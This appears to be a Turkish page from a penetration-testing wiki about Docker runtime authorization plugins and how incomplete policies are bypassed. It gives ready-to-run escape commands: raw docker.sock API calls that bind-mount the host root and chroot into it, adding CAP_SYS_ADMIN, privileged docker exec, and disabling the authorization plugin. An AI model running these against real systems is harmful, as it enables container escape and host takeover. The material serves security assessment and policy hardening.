# Çalışma Zamanı Yetkilendirme Eklentileri

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Runtime authorization plugins, bir çağıranın belirli bir daemon eylemini gerçekleştirip gerçekleştiremeyeceğine karar veren ekstra bir politika katmanıdır. Docker klasik örnektir. Varsayılan olarak, Docker daemon ile iletişim kurabilen herkes etkili olarak geniş bir kontrole sahiptir. Authorization plugins, kimlik doğrulanmış kullanıcıyı ve istenen API işlemini inceleyerek ve ardından politikaya göre isteği izin verip reddederek bu modeli daraltmaya çalışır.

Bu konu kendi sayfasını hak ediyor çünkü saldırganın zaten bir Docker API'sine veya `docker` grubundaki bir kullanıcıya erişimi olduğunda exploitation modelini değiştirir. Bu tür ortamlarda soru artık sadece "daemon'a ulaşabilir miyim?" değil, aynı zamanda "daemon bir authorization katmanı ile çevrelenmiş mi, eğer öyleyse bu katman unhandled endpoint'ler, zayıf JSON parsing veya plugin-management izinleri aracılığıyla atlatılabilir mi?" şeklindedir.

## İşleyiş

Bir istek Docker daemon'a ulaştığında, authorization alt sistemi isteğin bağlamını yüklü bir veya daha fazla plugine iletebilir. Plugin, kimlik doğrulanmış kullanıcı kimliğini, istek ayrıntılarını, seçili header'ları ve içerik tipi uygun olduğunda istek veya yanıt gövdesinin parçalarını görür. Birden fazla plugin zincirlenebilir ve erişim yalnızca tüm plugin'ler isteğe izin verirse sağlanır.

Bu model güçlü görünebilir, ancak güvenliği tamamen politika yazarının API'yi ne kadar eksiksiz anladığına bağlıdır. `docker run --privileged`'i engelleyen ama `docker exec`'i görmezden gelen, üst düzey `Binds` gibi alternatif JSON anahtarlarını kaçıran veya plugin administration'a izin veren bir plugin, doğrudan privilege-escalation yollarını açık bırakırken yanlış bir kısıtlama hissi yaratabilir.

## Yaygın Eklenti Hedefleri

Politika incelemesi için önemli alanlar şunlardır:

- container creation endpoints
- `HostConfig` alanları gibi `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` ve namespace-sharing seçenekleri
- `docker exec` davranışı
- plugin management endpoints
- amaçlanan politika modelinin dışında dolaylı olarak runtime eylemlerini tetikleyebilecek herhangi bir endpoint

Tarihsel olarak, Twistlock'un `authz` plugin'i ve `authobot` gibi basit eğitim amaçlı plugin'ler, politika dosyaları ve kod yolları endpoint-to-action eşlemesinin gerçekte nasıl uygulandığını gösterdiği için bu modeli incelemeyi kolaylaştırdı. Değerlendirme çalışmaları için önemli ders, politika yazarının sadece en görünür CLI komutlarını değil tüm API yüzeyini anlaması gerektiğidir.

## Kötüye Kullanım

İlk hedef, gerçekte nelerin engellendiğini öğrenmektir. Eğer daemon bir eylemi reddederse, hata genellikle eklenti adını leaks eder; bu da kullanılan kontrolü belirlemeye yardımcı olur:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Eğer daha geniş endpoint profiling'e ihtiyaç duyuyorsanız, `docker_auth_profiler` gibi araçlar kullanışlıdır; çünkü plugin tarafından gerçekten izin verilen API yollarını ve JSON yapılarını kontrol etme gibi tekrarlayan işleri otomatikleştirirler.

Eğer ortam özel bir plugin kullanıyorsa ve API ile etkileşim kurabiliyorsanız, hangi nesne alanlarının gerçekten filtrelendiğini listeleyin:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Bu kontroller önemlidir çünkü birçok yetkilendirme hatası kavramsal değil, alan-özgüdür. Bir plugin CLI desenini reddedebilir ancak eşdeğer API yapısını tam olarak engellemeyebilir.

### Tam Örnek: `docker exec` Konteyner Oluşturulduktan Sonra Yetki Ekler

privileged container oluşturmayı engelleyen ancak unconfined container oluşturulmasına ve `docker exec` kullanımına izin veren bir politika yine de atlatılabilir:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Eğer daemon ikinci adımı kabul ederse, kullanıcı, politika yazarı tarafından kısıtlı olduğuna inanılan bir container içinde ayrıcalıklı bir etkileşimli süreci yeniden kazanır.

### Tam Örnek: Bind Mount Through Raw API

Bazı hatalı politikalar yalnızca tek bir JSON yapısını denetler. Eğer root filesystem bind mount'ı tutarlı biçimde engellenmezse, host yine de mount edilebilir:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Aynı fikir `HostConfig` altında da görünebilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Etkisi, tam bir host filesystem escape'tir. İlginç detay, bypass'ın kernel bug'dan ziyade eksik politika kapsamından kaynaklanmasıdır.

### Tam Örnek: Unchecked Capability Attribute

Eğer politika capability ile ilgili bir attribute'u filtrelemeyi unutursa, saldırgan tehlikeli bir capability'yi geri kazanan bir container oluşturabilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Bir kez `CAP_SYS_ADMIN` veya benzer güçlü bir capability mevcut olduğunda, [capabilities.md](protections/capabilities.md) ve [privileged-containers.md](privileged-containers.md) dosyalarında açıklanan birçok breakout tekniği erişilebilir hâle gelir.

### Tam Örnek: Plugin'i Devre Dışı Bırakma

Eğer plugin-management işlemlerine izin veriliyorsa, en temiz bypass kontrolünü tamamen kapatmaktır:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Bu, control-plane düzeyinde bir politika hatasıdır. Yetkilendirme katmanı mevcut, ancak kısıtlanması gereken kullanıcı bunu devre dışı bırakma iznine hâlâ sahip.

## Kontroller

Bu komutlar, bir politika katmanının var olup olmadığını ve bunun tam mı yoksa yüzeysel mi göründüğünü belirlemeye yöneliktir.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- Reddetme mesajlarının içinde bir eklenti adı bulunması, bir yetkilendirme katmanını doğrular ve genellikle tam uygulamanın ne olduğunu açığa çıkarır.
- Saldırganın görebildiği bir eklenti listesi, devre dışı bırakma veya yeniden yapılandırma işlemlerinin mümkün olup olmadığını keşfetmek için yeterli olabilir.
- Yalnızca bariz CLI işlemlerini engelleyen ancak ham API isteklerini engellemeyen bir politika, aksi kanıtlanana kadar atlatılabilir kabul edilmelidir.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatmalar |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin değil | Daemon erişimi, bir yetkilendirme eklentisi yapılandırılmadıkça pratikte ya tümüyle ya hiç şeklindedir | eksik eklenti politikası, izin listeleri (allowlists) yerine kara listelerin kullanılması, eklenti yönetimine izin verilmesi, alan düzeyinde kör noktalar |
| Podman | Doğrudan yaygın bir eşdeğeri değil | Podman genellikle Docker tarzı yetkilendirme eklentilerinden ziyade Unix izinlerine, root'suz çalıştırmaya ve API açığa çıkarma kararlarına daha çok dayanır | geniş çapta root yetkili Podman API'si açmak, zayıf socket izinleri |
| containerd / CRI-O | Farklı bir kontrol modeli | Bu runtime'lar genellikle Docker yetkilendirme eklentilerinden ziyade socket izinlerine, node güven sınırlarına ve üst seviye orchestrator kontrollerine dayanır | socket'i iş yüklerine bağlama, zayıf node-yerel güven varsayımları |
| Kubernetes | API-server ve kubelet katmanlarında authn/authz kullanır, Docker authz eklentilerini kullanmaz | Cluster RBAC ve admission kontrolleri ana politika katmanıdır | çok geniş RBAC, zayıf admission politikası, kubelet veya runtime API'lerini doğrudan açığa çıkarma |
